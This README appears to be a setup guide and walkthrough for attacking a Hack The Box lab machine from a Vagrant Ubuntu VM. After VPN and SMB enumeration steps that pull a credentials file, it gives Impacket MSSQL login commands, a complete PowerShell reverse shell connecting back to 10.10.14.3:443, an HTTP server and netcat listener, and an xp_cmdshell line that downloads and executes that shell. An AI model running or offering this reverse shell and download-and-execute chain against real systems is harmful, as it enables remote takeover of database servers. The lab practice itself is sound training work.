# README.md
Build an ubuntu hack the box 
  
## Prequisites
[Vagrant Setup](../README.md)

## Build the VM

### Configure Network
Avoid adding to home network to prevent bridging. 

### Data Folder
1. Create a data folder in the repo root.
1. Download the ovpn file from HTB and copy to data folder

### Connect to HTB VPN
```sh
sudo openvpn /vagrant_data/<user>.ovpn
```

### Test 
```sh
nmap -sV 10.10.10.0/24
smbclient -N -L \\\\10.10.10.27\\
smbclient -N  \\\\10.10.10.27\\backups
dir
get prod.dtsConfig
cat prod.dtsConfig
```

### Impacket
```sh
git clone https://github.com/SecureAuthCorp/impacket
pip install .
./mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
```


### Reverse Shell
Find your local IP and save a script to host
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Host the script
```sh
python3 -m http.server 80
nc -lvnp 443
```

Enable Firewall
```sh
ufw allow from 10.10.10.27 proto tcp to any port 80,443
```

Invoke it from SQL
```
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"
```